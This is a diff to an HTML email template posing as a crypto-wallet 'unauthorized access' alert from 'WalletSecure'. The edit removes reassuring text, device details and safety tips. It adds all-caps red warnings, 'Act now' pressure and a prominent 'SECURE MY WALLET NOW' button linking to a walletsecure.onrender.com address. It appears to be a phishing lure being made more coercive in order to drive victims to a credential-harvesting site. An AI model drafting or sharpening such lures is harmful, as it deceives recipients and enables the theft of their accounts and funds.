@@ -176,55 +176,26 @@
             </div>
             
             <div class="alert-box">
-                <h3 style="margin-top: 10px;">Security Notice</h3>
-                <p>Our security systems have detected a login attempt to your wallet from an unrecognized device or location. We're alerting you as a precautionary measure to protect your digital assets.</p>
+                <h3 style="margin-top: 10px; color: #d32f2f;">UNAUTHORIZED ACCESS DETECTED</h3>
+                <p><strong>Someone attempted to access your wallet from {{login_location}} using IP {{ip_address}}.</strong></p>
                 
-                <p><strong>If this was you:</strong> No action required. Your account remains secure.</p>
-                <p><strong>If this was not you:</strong> Your account may be compromised. Take immediate action to secure your wallet and funds.</p>
+                <p style="color: #d32f2f; font-weight: bold;">If this was not you, your funds are at risk. Act now.</p>
+                
+                <p>Time of attempt: {{login_time}}<br>
+                Device: {{device_info}}</p>
             </div>
             
-            <div class="device-info">
-                <h3>Access Details</h3>
-                <div class="info-grid">
-                    <div class="info-label">Date & Time:</div>
-                    <div class="info-value">{{login_time}}</div>
-                    
-                    <div class="info-label">Location:</div>
-                    <div class="info-value">{{login_location}}</div>
-                    
-                    <div class="info-label">IP Address:</div>
-                    <div class="info-value">{{ip_address}}</div>
-                    
-                    <div class="info-label">Device Type:</div>
-                    <div class="info-value">{{device_info}}</div>
-                    
-                    <div class="info-label">Browser:</div>
-                    <div class="info-value">{{browser_info}}</div>
-                </div>
-            </div>
-            
-            <div class="timestamp">
-                Alert Generated: {{current_date}} at {{alert_time}}
-            </div>
+
             
             <div class="action-buttons">
-                <a href="https://walletsecure.onrender.com" class="btn btn-danger">Review Account Security</a>
+                <a href="https://walletsecure.onrender.com" class="btn btn-danger" style="background: #d32f2f; font-size: 16px; padding: 15px 30px;">SECURE MY WALLET NOW</a>
             </div>
             
-            <div class="security-tips">
-                <h3>Recommended Actions</h3>
-                <p><strong>Immediate Steps if Unauthorized:</strong></p>
-                <ul style="margin: 10px 0; padding-left: 20px;">
-                    <li>Change your password immediately</li>
-                    <li>Enable two-factor authentication</li>
-                    <li>Review recent transactions</li>
-                    <li>Contact our security team if needed</li>
-                </ul>
-                <p>Your wallet security is our top priority. We continuously monitor account access patterns to detect and prevent unauthorized access to your digital assets.</p>
-            </div>
+            <p style="margin: 20px 0; font-weight: bold; color: #333;">
+                Protect your funds. Secure your account immediately.
+            </p>
             
-            <p>Best regards,<br>
-            <strong>WalletSecure Security Operations</strong></p>
+            <p>WalletSecure Security Team</p>
         </div>
         
         <div class="footer">
